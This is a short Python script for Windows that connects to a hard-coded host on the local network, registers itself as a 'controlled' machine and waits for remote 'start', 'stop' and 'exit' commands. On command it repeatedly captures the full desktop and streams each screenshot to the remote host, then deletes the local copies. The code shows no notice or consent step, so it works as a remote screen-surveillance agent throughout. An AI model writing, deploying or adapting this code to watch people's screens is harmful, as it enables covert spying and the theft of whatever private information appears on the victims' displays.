import socket
import threading

from PIL import ImageGrab
from win32 import win32print, win32gui
import win32con
import os
import time

hDC = win32gui.GetDC(0)
w = win32print.GetDeviceCaps(hDC, win32con.DESKTOPHORZRES)
h = win32print.GetDeviceCaps(hDC, win32con.DESKTOPVERTRES)
if not os.path.exists('screenshots'):
    os.mkdir('screenshots')
do_exit = False


def command_response():
    global do_exit
    ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ss.connect(('10.100.55.185', 25566))
    ss.send(b'controlled')
    with open('../../../url.txt', 'r') as f:
        register_name = f.readlines()[0].split('/')[-2]
    time.sleep(2)
    ss.send(register_name.encode())
    print('开始')
    while True:
        content = ss.recv(1024)
        if content == b'start':
            do_exit = False
            threading.Thread(target=shot).start()
        elif content == b'stop':
            do_exit = True
        elif content == b'exit':
            do_exit = True
            time.sleep(1)
            ss.close()
            return


def shot():
    i = 1
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('10.100.55.185', 25565))
    try:
        while True:
            if do_exit:
                time.sleep(0.5)
                s.close()
                return
            image = ImageGrab.grab(bbox=(0, 0, w, h))
            file_name = f'{time.time()}.jpeg'
            image.save(f'screenshots/{file_name}', quality=30)
            size = os.path.getsize(f'screenshots/{file_name}')
            s.sendall(str(size).encode())
            s.recv(1024)
            with open(f'screenshots/{file_name}', 'rb') as f:
                while size > 0:
                    cf = f.read(524288)
                    s.sendall(cf)
                    size -= len(cf)
            s.recv(1024)
            print(i)
            i += 1
            os.remove(f'screenshots/{file_name}')
    except ConnectionResetError:
        s.close()


command_response()
